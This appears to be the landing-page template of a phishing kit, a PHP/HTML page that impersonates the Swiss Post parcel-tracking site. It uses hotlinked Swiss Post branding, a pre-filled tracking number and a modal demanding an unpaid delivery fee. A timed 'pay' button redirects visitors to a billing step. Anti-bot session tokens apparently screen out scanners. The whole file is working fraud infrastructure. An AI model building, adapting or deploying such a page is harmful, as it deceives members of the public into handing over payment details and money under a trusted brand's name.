<?php
require __DIR__ . '/security.php';
require __DIR__ . '/lang.php';

if (!isset($antibotplot) || empty($antibotplot)) {
    if (isset($_SESSION['antibotplot']) && !empty($_SESSION['antibotplot'])) {
        $antibotplot = $_SESSION['antibotplot'];
    } else {
        $antibotplot = bin2hex(random_bytes(16));
        $_SESSION['antibotplot'] = $antibotplot;
    }
}

setcookie('token', $antibotplot, [
    'path' => '/',
    'secure' => isset($_SERVER['HTTPS']),
    'httponly' => true,
    'samesite' => 'Strict'
]);

$_SESSION['land_load_time'] = time();
$nonce = hash_hmac('sha256', $antibotplot, session_id());
$_SESSION['land_nonce'] = $nonce;
?><!DOCTYPE html>
<html lang="<?php echo $currentLang; ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo t('site_title'); ?></title>
<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHHKFg8ixJBlUr6SNFiET4Do7BS-0YWVOTpb9GZ0OSNBTcQMW0">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
html{-webkit-text-size-adjust:100%;}
body{font-family:'Fira Sans',-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#1e1e1e;font-size:16px;line-height:1.5;}
a{text-decoration:none;color:inherit;}
img{max-width:100%;height:auto;}

:root {
    --post-yellow: #FFCC00;
    --post-yellow-dark: #E6B800;
    --post-red: #E2001A;
    --post-gray: #F5F5F5;
    --post-dark: #1e1e1e;
    --post-border: #e5e5e5;
}

/* HEADER */
.header{background:#fff;border-bottom:1px solid var(--post-border);display:flex;align-items:center;height:56px;padding:0 16px;position:sticky;top:0;z-index:100;}
.header-logo{display:flex;align-items:center;background:var(--post-yellow);height:56px;margin-left:-16px;padding:0 16px;}
.header-logo img{height:32px;}
.header-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.header-icon{display:flex;align-items:center;justify-content:center;width:40px;height:40px;cursor:pointer;}
.header-icon svg{width:24px;height:24px;fill:var(--post-dark);}
.header-text{font-size:13px;color:var(--post-dark);display:flex;align-items:center;gap:4px;}
.header-text svg{width:20px;height:20px;}

/* MAIN CONTENT */
.main{padding:24px 16px;}

/* TRACKING SECTION */
.track-section{margin-bottom:32px;}
.track-title{font-size:20px;font-weight:700;color:var(--post-dark);margin-bottom:16px;}
.track-box{background:var(--post-yellow);border-radius:4px;padding:20px;margin-bottom:24px;}
.track-input-wrap{background:#fff;border-radius:4px;margin-bottom:12px;}
.track-input{width:100%;border:none;padding:16px;font-size:16px;font-family:inherit;color:var(--post-dark);background:transparent;outline:none;}
.track-input::placeholder{color:#999;}
.track-btn{width:100%;background:var(--post-dark);color:#fff;border:none;border-radius:4px;padding:14px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;}
.track-btn:hover{background:#333;}

/* SERVICE CARDS */
.services-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-bottom:20px;}
.service-card{background:#fff;border:1px solid var(--post-border);border-radius:4px;padding:16px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:all 0.2s;}
.service-card:hover{border-color:var(--post-yellow);box-shadow:0 2px 8px rgba(0,0,0,0.08);}
.service-card.highlight{border:2px solid var(--post-yellow);background:#FFFDF5;}
.service-card svg{width:32px;height:32px;fill:var(--post-dark);margin-bottom:8px;}
.service-card.highlight svg{fill:var(--post-red);}
.service-card span{font-size:13px;font-weight:500;color:var(--post-dark);line-height:1.3;}

.all-services{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:500;color:var(--post-dark);margin-bottom:32px;}
.all-services svg{width:20px;height:20px;fill:var(--post-dark);}

/* HERO IMAGE */
.hero-image{margin:0 -16px;margin-bottom:0;}
.hero-image img{width:100%;height:auto;display:block;}

/* POST SECTION */
.post-section{background:var(--post-dark);color:#fff;padding:32px 20px;margin:0 -16px;}
.post-section h2{font-size:22px;font-weight:700;margin-bottom:4px;}
.post-section p{font-size:15px;opacity:0.9;margin-bottom:24px;}
.post-links{display:flex;flex-direction:column;}
.post-link{display:flex;align-items:center;justify-content:space-between;padding:16px 0;border-bottom:1px solid rgba(255,255,255,0.2);font-size:15px;font-weight:500;cursor:pointer;}
.post-link:last-child{border-bottom:none;}
.post-link svg{width:20px;height:20px;fill:#fff;opacity:0.7;}

/* FOOTER */
footer{background:var(--post-gray);padding:24px 16px;margin-top:32px;}
.footer-links{display:flex;flex-wrap:wrap;gap:16px;margin-bottom:16px;}
.footer-links a{font-size:13px;color:#666;}
.footer-copy{font-size:12px;color:#888;}

/* MODAL */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:flex-end;justify-content:center;z-index:999;opacity:0;visibility:hidden;transition:all 0.3s;}
.modal-overlay.show{opacity:1;visibility:visible;}
.modal{background:#fff;border-radius:16px 16px 0 0;width:100%;max-width:500px;max-height:90vh;overflow-y:auto;transform:translateY(100%);transition:transform 0.3s;}
.modal-overlay.show .modal{transform:translateY(0);}
.modal-handle{width:40px;height:4px;background:#ddd;border-radius:2px;margin:12px auto;}
.modal-header{background:var(--post-yellow);padding:20px;text-align:center;}
.modal-header h2{font-size:18px;font-weight:700;color:var(--post-dark);margin-bottom:4px;}
.modal-header p{font-size:14px;color:#333;}
.modal-body{padding:20px;}
.modal-alert{background:#FFF8E1;border-left:4px solid #F57C00;padding:14px;margin-bottom:20px;border-radius:0 4px 4px 0;}
.modal-alert-title{font-size:13px;font-weight:700;color:#F57C00;margin-bottom:4px;}
.modal-alert p{font-size:13px;color:#795548;line-height:1.5;}
.modal-info{font-size:14px;color:#555;line-height:1.8;margin-bottom:20px;}
.modal-info strong{color:var(--post-dark);}
.modal-info .status{color:var(--post-red);font-weight:600;}
.price-box{background:var(--post-gray);border-radius:8px;padding:16px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;}
.price-label{font-size:14px;color:#666;}
.price-label small{display:block;font-size:12px;color:#999;}
.price-value{font-size:26px;font-weight:800;color:var(--post-dark);}
.btn-pay{width:100%;background:var(--post-yellow);color:var(--post-dark);border:none;border-radius:4px;padding:16px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;}
.btn-pay:disabled{opacity:0.5;cursor:not-allowed;}
.btn-pay:hover:not(:disabled){background:var(--post-yellow-dark);}
.btn-pay svg{width:20px;height:20px;fill:currentColor;}
#cd-msg{text-align:center;font-size:13px;color:#888;margin-top:12px;}
.modal-secure{text-align:center;font-size:12px;color:#888;margin-top:16px;display:flex;align-items:center;justify-content:center;gap:6px;}
.modal-secure svg{width:14px;height:14px;fill:#888;}

/* DESKTOP */
@media(min-width:768px){
    .header{padding:0 32px;}
    .header-logo{margin-left:-32px;padding:0 24px;}
    .main{max-width:1200px;margin:0 auto;padding:32px;}
    .services-grid{grid-template-columns:repeat(3,1fr);}
    .hero-image{margin:0;border-radius:8px;overflow:hidden;}
    .post-section{margin:32px 0;border-radius:8px;}
    .modal{border-radius:16px;max-height:80vh;}
    .modal-overlay{align-items:center;}
}

/* LANGUAGE SWITCHER */
.lang-switch{display:flex;border:1px solid var(--post-border);border-radius:4px;overflow:hidden;}
.lang-btn{padding:6px 10px;font-size:12px;font-weight:600;color:#666;background:#fff;border:none;cursor:pointer;}
.lang-btn.active{background:var(--post-dark);color:#fff;}
</style>
</head>
<body>

<script>
if (typeof globalThis.token === "undefined") {
    globalThis.token = <?php echo json_encode($nonce); ?>;
}
</script>

<!-- HEADER -->
<header class="header">
    <div class="header-logo">
        <img src="https://media.20min.ch/7/image/2023/12/27/cf810a3b-398c-46b4-b5f3-fed4f2973f08.png?auto=format%2Ccompress%2Cenhance&fit=max&w=1600&h=1600&rect=0%2C0%2C2048%2C2048&fp-x=0.5&fp-y=0.5&s=eaf5294ac39e1a86e4764bc72644b55f" alt="Swiss Post">
    </div>
    <div class="header-right">
        <div class="lang-switch">
            <a href="?lang=de" class="lang-btn <?php echo $currentLang === 'de' ? 'active' : ''; ?>">DE</a>
            <a href="?lang=fr" class="lang-btn <?php echo $currentLang === 'fr' ? 'active' : ''; ?>">FR</a>
            <a href="?lang=en" class="lang-btn <?php echo $currentLang === 'en' ? 'active' : ''; ?>">EN</a>
        </div>
        <div class="header-icon">
            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
        </div>
        <div class="header-text">
            <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
            Login
        </div>
        <div class="header-icon">
            <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
        </div>
    </div>
</header>

<!-- MAIN CONTENT -->
<main class="main">
    <!-- TRACKING SECTION -->
    <section class="track-section">
        <h1 class="track-title"><?php echo t('track_title'); ?></h1>
        <div class="track-box">
            <div class="track-input-wrap">
                <input type="text" class="track-input" value="<?php echo $trackingNumber; ?>" readonly>
            </div>
            <button class="track-btn" id="open-modal"><?php echo $currentLang === 'de' ? 'Suchen' : ($currentLang === 'fr' ? 'Rechercher' : 'Search'); ?></button>
        </div>
    </section>

    <!-- SERVICE CARDS -->
    <section class="services-grid">
        <div class="service-card">
            <svg viewBox="0 0 24 24"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/></svg>
            <span><?php echo t('ql_shop'); ?></span>
        </div>
        <div class="service-card">
            <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
            <span><?php echo t('ql_prices'); ?></span>
        </div>
        <div class="service-card">
            <svg viewBox="0 0 24 24"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zm-.5 1.5l1.96 2.5H17V9.5h2.5zM6 18c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm12 0c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/></svg>
            <span><?php echo t('ql_labels'); ?></span>
        </div>
        <div class="service-card">
            <svg viewBox="0 0 24 24"><path d="M19 3H4.99c-1.11 0-1.98.89-1.98 2L3 19c0 1.1.88 2 1.99 2H19c1.1 0 2-.9 2-2V5c0-1.11-.9-2-2-2zm0 12h-4c0 1.66-1.35 3-3 3s-3-1.34-3-3H4.99V5H19v10z"/></svg>
            <span><?php echo t('ql_pickup'); ?></span>
        </div>
        <div class="service-card">
            <svg viewBox="0 0 24 24"><path d="M22 3H2v6h1v11c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V9h1V3zm-4 17H6V9h12v11zm2-13H4V5h16v2z"/></svg>
            <span><?php echo t('ql_stamps'); ?></span>
        </div>
        <div class="service-card highlight" id="open-modal-2">
            <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
            <span><?php echo t('ql_move'); ?></span>
        </div>
    </section>

    <a href="#" class="all-services">
        <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
        <?php echo $currentLang === 'de' ? 'Alle Onlinedienste' : ($currentLang === 'fr' ? 'Tous les services en ligne' : 'All online services'); ?>
    </a>

    <!-- HERO IMAGE -->
    <div class="hero-image">
        <img src="https://www.post.ch/-/media/portal-opp/k/bilder/teaser-post-startseite-1053x1053.jpg?mw=800" alt="livery">
    </div>

    <!-- POST SECTION -->
    <section class="post-section">
        <h2><?php echo $currentLang === 'de' ? 'Post für Sie' : ($currentLang === 'fr' ? 'Courrier pour vous' : 'Post for you'); ?></h2>
        <p><?php echo $currentLang === 'de' ? 'Einfach versenden, schnell ankommen' : ($currentLang === 'fr' ? 'Facile à envoyer, rapide à arriver' : 'Easy to send, fast to arrive'); ?></p>

        <div class="post-links">
            <div class="post-link">
                <span><?php echo t('nav_send_letters'); ?></span>
                <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg>
            </div>
            <div class="post-link">
                <span><?php echo t('nav_send_packages'); ?></span>
                <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg>
            </div>
            <div class="post-link">
                <span><?php echo $currentLang === 'de' ? 'Express und Kurier' : ($currentLang === 'fr' ? 'Express et coursier' : 'Express and courier'); ?></span>
                <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg>
            </div>
            <div class="post-link">
                <span><?php echo $currentLang === 'de' ? 'Einschreiben' : ($currentLang === 'fr' ? 'Recommandé' : 'Registered mail'); ?></span>
                <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg>
            </div>
        </div>
    </section>
</main>

<!-- FOOTER -->
<footer>
    <div class="footer-links">
        <a href="#"><?php echo t('footer_privacy'); ?></a>
        <a href="#"><?php echo t('footer_terms'); ?></a>
    </div>
    <div class="footer-copy">&copy; 2024 <?php echo t('footer_copyright'); ?></div>
</footer>

<!-- MODAL -->
<div class="modal-overlay" id="pay-modal">
    <div class="modal">
        <div class="modal-handle"></div>
        <div class="modal-header">
            <h2><?php echo t('modal_title'); ?></h2>
            <p>#<?php echo $trackingNumber; ?></p>
        </div>
        <div class="modal-body">
            <div class="modal-alert">
                <div class="modal-alert-title"><?php echo t('modal_alert_title'); ?></div>
                <p><?php echo t('modal_alert_text'); ?></p>
            </div>
            <div class="modal-info">
                <strong><?php echo t('modal_tracking'); ?></strong>: #<?php echo $trackingNumber; ?><br>
                <strong><?php echo t('modal_status'); ?></strong>: <span class="status"><?php echo t('modal_status_pending'); ?></span><br>
                <strong><?php echo t('modal_fees'); ?></strong>: <?php echo $currency; ?> <?php echo $amount; ?>
            </div>
            <div class="price-box">
                <div class="price-label"><?php echo t('modal_total'); ?><small><?php echo t('modal_total_sub'); ?></small></div>
                <div class="price-value"><?php echo $currency; ?> <?php echo $amount; ?></div>
            </div>
            <button class="btn-pay" id="pay-btn" disabled>
                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
                <?php echo t('modal_pay_btn'); ?>
            </button>
            <div id="cd-msg"><?php echo t('modal_wait'); ?> <span id="cd-n">3</span>s...</div>
            <div class="modal-secure">
                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
                <?php echo t('modal_secure'); ?>
            </div>
        </div>
    </div>
</div>

<script>
(function(){
    var modal = document.getElementById('pay-modal');
    var btnOpen = document.getElementById('open-modal');
    var btnOpen2 = document.getElementById('open-modal-2');
    var btnPay = document.getElementById('pay-btn');
    var cdMsg = document.getElementById('cd-msg');
    var cdN = document.getElementById('cd-n');
    var timer = null, remain = 3;

    function startCd() {
        remain = 3;
        cdN.textContent = remain;
        cdMsg.style.display = 'block';
        btnPay.disabled = true;
        clearInterval(timer);
        timer = setInterval(function() {
            remain--;
            if (remain > 0) {
                cdN.textContent = remain;
            } else {
                clearInterval(timer);
                btnPay.disabled = false;
                cdMsg.style.display = 'none';
            }
        }, 1000);
    }

    function openModal() {
        modal.classList.add('show');
        document.body.style.overflow = 'hidden';
        startCd();
    }

    btnOpen.addEventListener('click', openModal);
    btnOpen2.addEventListener('click', openModal);

    modal.addEventListener('click', function(e) {
        if (e.target === modal) {
            modal.classList.remove('show');
            document.body.style.overflow = '';
            clearInterval(timer);
        }
    });

    btnPay.addEventListener('click', function() {
        if (this.disabled) return;
        if (typeof globalThis.token === 'undefined' || !globalThis.token) {
            console.error('Token manquant');
            return;
        }
        window.location.href = '?s=billing';
    });
})();
</script>
<script src="/assets/js/main.js"></script>
</body>
</html>
